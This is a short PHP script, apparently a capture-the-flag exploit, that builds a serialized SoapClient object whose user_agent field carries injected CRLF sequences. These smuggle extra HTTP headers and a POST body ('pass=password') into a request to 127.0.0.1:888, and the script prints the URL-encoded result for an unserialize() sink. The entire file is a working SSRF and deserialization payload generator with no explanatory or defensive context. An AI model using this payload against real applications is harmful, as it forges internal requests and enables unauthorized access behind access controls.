<?php
$post_data='pass=password';
$data_len=strlen($post_data);
$a = new SoapClient(null,array('location'=>'http://127.0.0.1:888','user_agent'=>'admin^^Content-Type: application/x-www-form-urlencoded^^Content-Length: '.$data_len.'^^^^'.$post_data,'uri'=>'bbba'));
$b = serialize($a);
$b = str_replace('^^',"\r\n",$b);
$b = str_replace('&','&',$b);
echo urlencode($b);